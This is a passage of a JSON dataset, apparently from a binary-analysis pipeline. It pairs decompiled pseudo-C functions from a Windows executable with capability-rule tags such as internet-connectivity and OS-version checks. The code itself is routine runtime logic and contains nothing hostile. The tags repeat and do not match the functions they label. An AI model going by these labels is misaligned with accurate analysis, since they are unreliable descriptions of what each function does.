            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400a38f0(int64_t arg1, int64_t *arg2, int64_t arg3)\n\n{\n    uint64_t **ppuVar1;\n    uint64_t *puVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    ulong *arg1_00;\n    int64_t **arg1_01;\n    int64_t iVar5;\n    uint64_t **ppuVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    int32_t *piVar9;\n    \n    piVar9 = *0x14010fc90;\n    if (*0x1401068b0 == '\\0') goto code_r0x0001400a3b38;\n    while ((*piVar9 != 0 && (iVar3 = fcn.140014970(0x140109380),  iVar3 != 0))) {\n        arg1_00 = fcn.1400bc7f0(8);\n        *arg1_00 = 0x140116310;\n        fcn.1400bcdb0(arg1_00, 0x1401118e0, 0x140021a20);\ncode_r0x0001400a3b38:\n        iVar3 = fcn.1400bcbc0(0x1401068b0);\n        piVar9 = *0x14010fc90;\n        if (iVar3 != 0) {\n            if (**0x14010fc90 != 0) {\n                fcn.140014930(0x140109380);\n            }\n            fcn.1400014f0(0x1400bcf40);\n            fcn.1400bccc0(0x1401068b0);\n        }\n    }\n    puVar2 = **0x14010ff70;\n    iVar3 = *0x140108770;\n    ppuVar6 = *0x14010ff70;\n    while (iVar8 = arg3,  *0x140108770 = iVar3,  puVar2 != NULL) {\n        uVar4 = *puVar2;\n        if (uVar4 == 0) {\n            if (*piVar9 == 0) {\n                *0x140108770 = iVar3 + 1;\n                uVar4 = *0x140108770;\n                *puVar2 = uVar4;\n                goto code_r0x0001400a3964;\n            }\n            LOCK();\n            *0x140108770 = iVar3 + 1;\n            LOCK();\n            *puVar2 = *puVar2 ^ (*puVar2 == 0) * (*puVar2 ^ iVar3 + 1);\n            uVar4 = *puVar2;\n            puVar2 = ppuVar6[1];\n            uVar7 = *puVar2;\n            iVar3 = *0x140108770;\n        }\n        else {\ncode_r0x0001400a3964:\n            puVar2 = ppuVar6[1];\n            uVar7 = *puVar2;\n            iVar3 = *0x140108770;\n        }\n        if (arg3 == uVar4 - 1) {\n            *0x140108770 = iVar3;\n            if (uVar7 == 0) {\n                if (*piVar9 == 0) {\n                    *0x140108770 = iVar3 + 1;\n                    uVar7 = *0x140108770;\n                    *puVar2 = uVar7;\n                }\n                else {\n                    LOCK();\n                    *0x140108770 = iVar3 + 1;\n                    LOCK();\n                    *puVar2 = *puVar2 ^ (*puVar2 == 0) * (*puVar2 ^ iVar3 + 1);\n                    uVar7 = *puVar2;\n                }\n            }\n            arg3 = uVar7 - 1;\n            goto code_r0x0001400a3a9f;\n        }\n        if (uVar7 == 0) {\n            if (*piVar9 == 0) {\n                *0x140108770 = iVar3 + 1;\n                uVar7 = *0x140108770;\n                *puVar2 = uVar7;\n                iVar3 = *0x140108770;\n            }\n            else {\n                LOCK();\n                *0x140108770 = iVar3 + 1;\n                LOCK();\n                *puVar2 = *puVar2 ^ (*puVar2 == 0) * (*puVar2 ^ iVar3 + 1);\n                uVar7 = *puVar2;\n                iVar3 = *0x140108770;\n            }\n        }\n        if (arg3 == uVar7 - 1) {\n            puVar2 = *ppuVar6;\n            uVar4 = *puVar2;\n            *0x140108770 = iVar3;\n            if (uVar4 == 0) {\n                if (*piVar9 == 0) {\n                    *0x140108770 = iVar3 + 1;\n                    uVar4 = *0x140108770;\n                    *puVar2 = uVar4;\n                }\n                else {\n                    LOCK();\n                    *0x140108770 = iVar3 + 1;\n                    LOCK();\n                    *puVar2 = *puVar2 ^ (*puVar2 == 0) * (*puVar2 ^ iVar3 + 1);\n                    uVar4 = *puVar2;\n                }\n            }\n            iVar8 = uVar4 - 1;\n            goto code_r0x0001400a3a9f;\n        }\n        ppuVar1 = ppuVar6 + 2;\n        ppuVar6 = ppuVar6 + 2;\n        puVar2 = *ppuVar1;\n    }\n    arg3 = -1;\ncode_r0x0001400a3a9f:\n    iVar5 = *(arg1 + 0x18);\n    arg1_01 = iVar5 + iVar8 * 8;\n    if (*arg1_01 == NULL) goto code_r0x0001400a3bc0;\n    if (arg2 != NULL) {\n        if (*(*arg2 + 8) == 0x1400a5780) {\n            fcn.1400bc6c0();\n        }\n        else {\n            (**(*arg2 + 8))();\n        }\n    }\n    iVar3 = *piVar9;\n    while( true ) {\n        if (iVar3 == 0) {\n            return;\n        }\n        iVar3 = fcn.1400149e0(0x140109380);\n        if (iVar3 == 0) {\n            return;\n        }\n        arg1_01 = fcn.1400bc7f0(8);\n        arg3 = 0x140111900;\n        *arg1_01 = 0x140116340;\n        iVar5 = fcn.1400bcdb0(arg1_01, 0x140111900, 0x140021a60);\ncode_r0x0001400a3bc0:\n        if (*piVar9 == 0) break;\n        LOCK();\n        *(arg2 + 1) = *(arg2 + 1) + 1;\n        iVar5 = *(arg1 + 0x18);\n        iVar3 = *piVar9;\n        *(iVar5 + iVar8 * 8) = arg2;\n        if (arg3 != -1) {\n            if (iVar3 == 0) {\ncode_r0x0001400a3bd9:\n                *(arg2 + 1) = *(arg2 + 1) + 1;\n                *(iVar5 + arg3 * 8) = arg2;\n                return;\n            }\n            LOCK();\n            *(arg2 + 1) = *(arg2 + 1) + 1;\n            iVar3 = *piVar9;\n            *(*(arg1 + 0x18) + arg3 * 8) = arg2;\n        }\n    }\n    *(arg2 + 1) = *(arg2 + 1) + 1;\n    *arg1_01 = arg2;\n    if (arg3 == -1) {\n        return;\n    }\n    goto code_r0x0001400a3bd9;\n}\n",
        "token_count": 1801
    },
    "1400a3cb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400a3cb0(int64_t arg1, uint64_t *arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    int64_t **ppiVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    int64_t *piVar12;\n    uint64_t **ppuVar13;\n    int64_t *piVar14;\n    uint64_t uVar15;\n    uint64_t *puVar16;\n    int32_t *piVar17;\n    uint64_t uVar18;\n    uint64_t *arg2_00;\n    int64_t **ppiVar19;\n    \n    piVar17 = *0x14010fc90;\n    if (arg3 == NULL) {\n        return;\n    }\n    uVar18 = *arg2;\n    if (uVar18 == 0) {\n        if (**0x14010fc90 != 0) {\n            LOCK();\n            iVar6 = *0x140108770 + 1;\n            LOCK();\n            *0x140108770 = *0x140108770 + 1;\n            *arg2 = *arg2 ^ (*arg2 == 0) * (*arg2 ^ iVar6);\n            uVar18 = *arg2;\n            goto code_r0x0001400a3cdb;\n        }\n        *0x140108770 = *0x140108770 + 1;\n        iVar11 = *(arg1 + 0x10);\n        uVar18 = *0x140108770;\n        uVar15 = uVar18 - 1;\n        *arg2 = uVar18;\n        if (iVar11 - 1U < uVar15) goto code_r0x0001400a3cf0;\n    }\n    else {\ncode_r0x0001400a3cdb:\n        uVar15 = uVar18 - 1;\n        if (*(arg1 + 0x10) - 1U < uVar15) {\ncode_r0x0001400a3cf0:\n            uVar10 = uVar18 + 3;\n            iVar11 = *(arg1 + 8);\n            iVar9 = -1;\n            if (uVar10 < 0x1000000000000000) {\n                iVar9 = uVar10 * 8;\n            }\n            iVar7 = fcn.1400bc6e0(iVar9);\n            uVar3 = *(arg1 + 0x10);\n            if (uVar3 != 0) {\n                iVar4 = *(arg1 + 8);\n                uVar8 = 0;\n                do {\n                    *(iVar7 + uVar8 * 8) = *(iVar4 + uVar8 * 8);\n                    uVar8 = uVar8 + 1;\n                } while (uVar8 != uVar3);\n            }\n            if (uVar3 < uVar10) {\n                sub.msvcrt.dll_memset(iVar7 + uVar3 * 8, 0, (uVar10 - uVar3) * 8);\n            }\n            iVar4 = *(arg1 + 0x18);\n            iVar9 = fcn.1400bc6e0(iVar9);\n            uVar3 = *(arg1 + 0x10);\n            if (uVar3 != 0) {\n                iVar5 = *(arg1 + 0x18);\n                uVar8 = 0;\n                do {\n                    *(iVar9 + uVar8 * 8) = *(iVar5 + uVar8 * 8);\n                    uVar8 = uVar8 + 1;\n                } while (uVar8 != uVar3);\n            }\n            if (uVar3 < uVar10) {\n                sub.msvcrt.dll_memset(iVar9 + uVar3 * 8, 0, (uVar10 - uVar3) * 8);\n            }\n            *(arg1 + 0x10) = uVar10;\n            *(arg1 + 8) = iVar7;\n            *(arg1 + 0x18) = iVar9;\n            if (iVar11 != 0) {\n                fcn.1400bc6b0(iVar11);\n            }\n            if (iVar4 != 0) {\n                fcn.1400bc6b0(iVar4);\n            }\n        }\n        piVar17 = *0x14010fc90;\n        if (**0x14010fc90 != 0) {\n            LOCK();\n            *(arg3 + 1) = *(arg3 + 1) + 1;\n            goto code_r0x0001400a3e0f;\n        }\n    }\n    *(arg3 + 1) = *(arg3 + 1) + 1;\ncode_r0x0001400a3e0f:\n    ppiVar2 = *(arg1 + 8) + uVar15 * 8;\n    piVar12 = *ppiVar2;\n    if (piVar12 != NULL) {\n        puVar16 = **0x14010ff70;\n        ppuVar13 = *0x14010ff70;\n        if (puVar16 != NULL) {\n            do {\n                uVar15 = *puVar16;\n                if (uVar15 != 0) {\ncode_r0x0001400a3e55:\n                    arg2_00 = ppuVar13[1];\n                    uVar10 = *arg2_00;\n                    if (uVar18 != uVar15) goto code_r0x0001400a3e61;\ncode_r0x0001400a3ee0:\n                    iVar11 = *(arg1 + 8);\n                    if (uVar10 == 0) {\n                        if (*piVar17 != 0) {\n                            LOCK();\n                            iVar6 = *0x140108770 + 1;\n                            LOCK();\n                            *0x140108770 = *0x140108770 + 1;\n                            *arg2_00 = *arg2_00 ^ (*arg2_00 == 0) * (*arg2_00 ^ iVar6);\n                            uVar10 = *arg2_00;\n                            goto code_r0x0001400a401f;\n                        }\n                        *0x140108770 = *0x140108770 + 1;\n                        ppiVar19 = iVar11 + -8 + *0x140108770 * 8;\n                        *arg2_00 = *0x140108770;\n                        if (*ppiVar19 != NULL) goto code_r0x0001400a41d0;\ncode_r0x0001400a3f1e:\n                        piVar12 = *ppiVar2;\n                        goto code_r0x0001400a403e;\n                    }\ncode_r0x0001400a401f:\n                    ppiVar19 = iVar11 + -8 + uVar10 * 8;\n                    if (*ppiVar19 != NULL) {\n                        arg2_00 = ppuVar13[1];\ncode_r0x0001400a41d0:\n                        piVar12 = fcn.14002d1e0(arg3, arg2_00);\n                        if (*piVar17 == 0) {\n                            *(piVar12 + 1) = *(piVar12 + 1) + 1;\n                            piVar14 = *ppiVar19;\ncode_r0x0001400a41ef:\n                            iVar6 = *(piVar14 + 1);\n                            *(piVar14 + 1) = iVar6 + -1;\n                        }\n                        else {\n                            LOCK();\n                            *(piVar12 + 1) = *(piVar12 + 1) + 1;\n                            piVar14 = *ppiVar19;\n                            piVar1 = piVar14 + 1;\n                            if (*piVar17 == 0) goto code_r0x0001400a41ef;\n                            LOCK();\n                            iVar6 = *piVar1;\n                            *piVar1 = *piVar1 + -1;\n                        }\n                        if (iVar6 == 1) {\n                            if (*(*piVar14 + 8) != 0x1400a5780) {\n                                (**(*piVar14 + 8))();\n                                goto code_r0x0001400a41fd;\n                            }\n                            goto code_r0x0001400a41c5;\n                        }\ncode_r0x0001400a41fd:\n                        *ppiVar19 = piVar12;\n                        piVar12 = *ppiVar2;\n                        goto code_r0x0001400a4033;\n                    }\n                    break;\n                }\n                if (*piVar17 == 0) {\n                    *0x140108770 = *0x140108770 + 1;\n                    uVar15 = *0x140108770;\n                    *puVar16 = uVar15;\n                    goto code_r0x0001400a3e55;\n                }\n                LOCK();\n                iVar6 = *0x140108770 + 1;\n                LOCK();\n                *0x140108770 = *0x140108770 + 1;\n                *puVar16 = *puVar16 ^ (*puVar16 == 0) * (*puVar16 ^ iVar6);\n                arg2_00 = ppuVar13[1];\n                uVar10 = *arg2_00;\n                if (uVar18 == *puVar16) goto code_r0x0001400a3ee0;\ncode_r0x0001400a3e61:\n                iVar6 = *0x140108770;\n                if (uVar10 == 0) {\n                    if (*piVar17 == 0) {\n                        *0x140108770 = *0x140108770 + 1;\n                        uVar10 = *0x140108770;\n                        *arg2_00 = uVar10;\n                        iVar6 = *0x140108770;\n                    }\n                    else {\n                        LOCK();\n                        iVar6 = *0x140108770 + 1;\n                        LOCK();\n                        *0x140108770 = *0x140108770 + 1;\n                        *arg2_00 = *arg2_00 ^ (*arg2_00 == 0) * (*arg2_00 ^ iVar6);\n                        uVar10 = *arg2_00;\n                        iVar6 = *0x140108770;\n                    }\n                }\n                *0x140108770 = iVar6;\n                if (uVar18 == uVar10) {\n                    puVar16 = *ppuVar13;\n                    iVar11 = *(arg1 + 8);\n                    uVar18 = *puVar16;\n                    if (uVar18 == 0) {\n                        if (*piVar17 != 0) {\n                            LOCK();\n                            *0x140108770 = iVar6 + 1;\n                            LOCK();\n                            *puVar16 = *puVar16 ^ (*puVar16 == 0) * (*puVar16 ^ iVar6 + 1);\n                            uVar18 = *puVar16;\n                            goto code_r0x0001400a416d;\n                        }\n                        *0x140108770 = iVar6 + 1;\n                        ppiVar19 = iVar11 + -8 + *0x140108770 * 8;\n                        *puVar16 = *0x140108770;\n                        if (*ppiVar19 == NULL) goto code_r0x0001400a3f1e;\n                    }\n                    else {\ncode_r0x0001400a416d:\n                        ppiVar19 = iVar11 + -8 + uVar18 * 8;\n                        if (*ppiVar19 == NULL) break;\n                        puVar16 = *ppuVar13;\n                    }\n                    piVar12 = fcn.14002c6e0(arg3, puVar16);\n                    if (*piVar17 == 0) {\n                        *(piVar12 + 1) = *(piVar12 + 1) + 1;\n                        piVar14 = *ppiVar19;\ncode_r0x0001400a41a0:\n                        iVar6 = *(piVar14 + 1);\n                        *(piVar14 + 1) = iVar6 + -1;\n                    }\n                    else {\n                        LOCK();\n                        *(piVar12 + 1) = *(piVar12 + 1) + 1;\n                        piVar14 = *ppiVar19;\n                        piVar1 = piVar14 + 1;\n                        if (*piVar17 == 0) goto code_r0x0001400a41a0;\n                        LOCK();\n                        iVar6 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar6 == 1) {\n                        if (*(*piVar14 + 8) == 0x1400a5780) {\ncode_r0x0001400a41c5:\n                            fcn.1400bc6c0();\n                        }\n                        else {\n                            (**(*piVar14 + 8))();\n                        }\n                    }\n                    goto code_r0x0001400a41fd;\n                }\n                puVar16 = ppuVar13[2];\n                ppuVar13 = ppuVar13 + 2;\n            } while (puVar16 != NULL);\n            piVar12 = *ppiVar2;\n        }\ncode_r0x0001400a4033:\n        if (*piVar17 == 0) {\ncode_r0x0001400a403e:\n            iVar6 = *(piVar12 + 1);\n            *(piVar12 + 1) = iVar6 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = piVar12 + 1;\n            iVar6 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar6 == 1) {\n            if (*(*piVar12 + 8) == 0x1400a5780) {\n                fcn.1400bc6c0();\n            }\n            else {\n                (**(*piVar12 + 8))(piVar12);\n            }\n        }\n    }\n    iVar11 = *(arg1 + 0x10);\n    *ppiVar2 = arg3;\n    if (iVar11 != 0) {\n        iVar11 = *(arg1 + 0x18);\n        uVar18 = 0;\n        do {\n            piVar12 = *(iVar11 + uVar18 * 8);\n            if (piVar12 != NULL) {\n                if (*piVar17 == 0) {\n                    iVar6 = *(piVar12 + 1);\n                    *(piVar12 + 1) = iVar6 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = piVar12 + 1;\n                    iVar6 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar6 == 1) {\n                    if (*(*piVar12 + 8) == 0x1400a5780) {\n                        fcn.1400bc6c0();\n                    }\n                    else {\n                        (**(*piVar12 + 8))();\n                    }\n                }\n                iVar11 = *(arg1 + 0x18);\n                *(iVar11 + uVar18 * 8) = 0;\n            }\n            uVar18 = uVar18 + 1;\n        } while (uVar18 < *(arg1 + 0x10));\n    }\n    return;\n}\n",
        "token_count": 3387
    },
    "1400a548": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400a5480(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    \n    piVar3 = *0x14010fc90;\n    iVar5 = *(arg1 + 8);\n    if (iVar5 != 0) {\n        if (*(arg1 + 0x10) != 0) {\n            uVar6 = 0;\n            do {\n                piVar2 = *(iVar5 + uVar6 * 8);\n                if (piVar2 != NULL) {\n                    if (*piVar3 == 0) {\n                        iVar4 = *(piVar2 + 1);\n                        *(piVar2 + 1) = iVar4 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar1 = piVar2 + 1;\n                        iVar4 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar4 == 1) {\n                        if (*(*piVar2 + 8) == 0x1400a5780) {\n                            fcn.1400bc6c0();\n                        }\n                        else {\n                            (**(*piVar2 + 8))();\n                        }\n                    }\n                    iVar5 = *(arg1 + 8);\n                }\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < *(arg1 + 0x10));\n            if (iVar5 == 0) goto code_r0x0001400a550d;\n        }\n        fcn.1400bc6b0(iVar5);\n    }\ncode_r0x0001400a550d:\n    piVar3 = *0x14010fc90;\n    iVar5 = *(arg1 + 0x18);\n    if (iVar5 != 0) {\n        if (*(arg1 + 0x10) != 0) {\n            uVar6 = 0;\n            do {\n                piVar2 = *(iVar5 + uVar6 * 8);\n                if (piVar2 != NULL) {\n                    if (*piVar3 == 0) {\n                        iVar4 = *(piVar2 + 1);\n                        *(piVar2 + 1) = iVar4 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar1 = piVar2 + 1;\n                        iVar4 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar4 == 1) {\n                        if (*(*piVar2 + 8) == 0x1400a5780) {\n                            fcn.1400bc6c0();\n                        }\n                        else {\n                            (**(*piVar2 + 8))();\n                        }\n                    }\n                    iVar5 = *(arg1 + 0x18);\n                }\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < *(arg1 + 0x10));\n            if (iVar5 == 0) goto code_r0x0001400a558d;\n        }\n        fcn.1400bc6b0(iVar5);\n    }\ncode_r0x0001400a558d:\n    iVar5 = *(arg1 + 0x20);\n    iVar7 = 0;\n    if (iVar5 != 0) {\n        do {\n            if (*(iVar5 + iVar7) != 0) {\n                fcn.1400bc6b0();\n                iVar5 = *(arg1 + 0x20);\n            }\n            iVar7 = iVar7 + 8;\n        } while (iVar7 != 0x30);\n        if (iVar5 != 0) {\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(iVar5);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 895
    },
    "1400a571": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400a5710(ulong *arg1, char *arg2)\n\n{\n    *arg1 = 0;\n    if (*arg2 == 'C') goto code_r0x0001400a5730;\n    do {\n        fcn.1400bd400(\"locale::facet::_S_create_c_locale name not valid\");\ncode_r0x0001400a5730:\n    } while (arg2[1] != '\\0');\n    return;\n}\n",
        "token_count": 103
    },
    "1400a5b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a5b40(int32_t **arg1, int32_t **arg2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = *0x140108760;\n    piVar2 = *arg2;\n    if (piVar2 != *0x140108760) {\n        if (**0x14010fc90 == 0) {\n            *piVar2 = *piVar2 + 1;\n        }\n        else {\n            LOCK();\n            *piVar2 = *piVar2 + 1;\n            piVar3 = *0x140108760;\n        }\n    }\n    piVar2 = *arg1;\n    if (piVar2 != piVar3) {\n        if (**0x14010fc90 == 0) {\n            iVar1 = *piVar2;\n            *piVar2 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.1400a5480(piVar2);\n            fcn.1400bc6c0(piVar2);\n            *arg1 = *arg2;\n            return;\n        }\n    }\n    *arg1 = *arg2;\n    return;\n}\n",
        "token_count": 309
    },
    "1400a6b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t ** fcn.1400a6b40(int64_t **arg1, int64_t arg2, uint64_t arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    uchar *puVar2;\n    int64_t *piVar3;\n    uchar *puVar4;\n    int64_t **ppiVar5;\n    uint64_t uVar6;\n    int64_t *piVar7;\n    int64_t iVar8;\n    bool bVar9;\n    uint64_t in_stack_00000028;\n    \n    piVar3 = arg1[1];\n    if ((arg3 + 0x3fffffffffffffff) - piVar3 < in_stack_00000028) {\n        iVar8 = 0x14010bbe5;\n        fcn.1400bd360(0x14010bbe5);\n        ppiVar5 = 0x7fffffff;\n        uVar6 = iVar8 - arg2;\n        if ((uVar6 < 0x80000000) && (ppiVar5 = 0x80000000,  -0x80000001 < uVar6)) {\n            ppiVar5 = uVar6 & 0xffffffff;\n        }\n        return ppiVar5;\n    }\n    ppiVar5 = *arg1;\n    piVar1 = piVar3 + (in_stack_00000028 - arg3);\n    if (ppiVar5 == arg1 + 2) {\n        piVar7 = 0xf;\n    }\n    else {\n        piVar7 = arg1[2];\n    }\n    if (piVar7 < piVar1) {\n        fcn.1400a9390(arg1, arg2, arg3, arg4);\n        goto code_r0x0001400a6c0d;\n    }\n    puVar2 = ppiVar5 + arg2;\n    iVar8 = piVar3 - (arg2 + arg3);\n    bVar9 = iVar8 == 0;\n    if ((arg4 < ppiVar5) || (ppiVar5 + piVar3 < arg4)) {\n        if ((arg3 != in_stack_00000028) && (!bVar9)) {\n            if (iVar8 == 1) {\n                puVar2[in_stack_00000028] = puVar2[arg3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar2 + in_stack_00000028, puVar2 + arg3, iVar8);\n            }\n        }\n        if (in_stack_00000028 == 0) goto code_r0x0001400a6c0d;\n        if (in_stack_00000028 != 1) {\n            sub.msvcrt.dll_memcpy(puVar2, arg4, in_stack_00000028);\n            goto code_r0x0001400a6c0d;\n        }\n    }\n    else {\n        if (in_stack_00000028 - 1 < arg3) {\n            if (in_stack_00000028 != 1) {\n                sub.msvcrt.dll_memmove(puVar2, arg4, in_stack_00000028);\n                goto code_r0x0001400a6c69;\n            }\n            *puVar2 = *arg4;\n            if ((arg3 == 1) || (bVar9)) goto code_r0x0001400a6c0d;\n            puVar4 = puVar2 + 1;\n            if (iVar8 == 1) {\n                puVar2[1] = puVar2[arg3];\n                goto code_r0x0001400a6c0d;\n            }\ncode_r0x0001400a6c87:\n            sub.msvcrt.dll_memmove(puVar4, puVar2 + arg3, iVar8);\n        }\n        else {\ncode_r0x0001400a6c69:\n            if ((arg3 != in_stack_00000028) && (!bVar9)) {\n                puVar4 = puVar2 + in_stack_00000028;\n                if (iVar8 != 1) goto code_r0x0001400a6c87;\n                *puVar4 = puVar2[arg3];\n            }\n        }\n        if (in_stack_00000028 <= arg3) goto code_r0x0001400a6c0d;\n        ppiVar5 = puVar2 + arg3;\n        if (ppiVar5 < arg4 + in_stack_00000028) {\n            if (arg4 < ppiVar5) {\n                uVar6 = ppiVar5 - arg4;\n                if (uVar6 == 1) {\n                    *puVar2 = *arg4;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar2, arg4, uVar6);\n                }\n                if (in_stack_00000028 - uVar6 == 1) {\n                    puVar2[uVar6] = puVar2[in_stack_00000028];\n                }\n                else if (in_stack_00000028 != uVar6) {\n                    sub.msvcrt.dll_memcpy();\n                }\n            }\n            else {\n                puVar4 = arg4 + (in_stack_00000028 - arg3);\n                if (in_stack_00000028 == 1) {\n                    *puVar2 = *puVar4;\n                }\n                else {\n                    sub.msvcrt.dll_memcpy(puVar2, puVar4, in_stack_00000028);\n                }\n            }\n            goto code_r0x0001400a6c0d;\n        }\n        if (in_stack_00000028 != 1) {\n            sub.msvcrt.dll_memmove(puVar2, arg4, in_stack_00000028);\n            goto code_r0x0001400a6c0d;\n        }\n    }\n    *puVar2 = *arg4;\ncode_r0x0001400a6c0d:\n    arg1[1] = piVar1;\n    *(*arg1 + piVar1) = 0;\n    return arg1;\n}\n",
        "token_count": 1323
    },
    "1400a6eb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
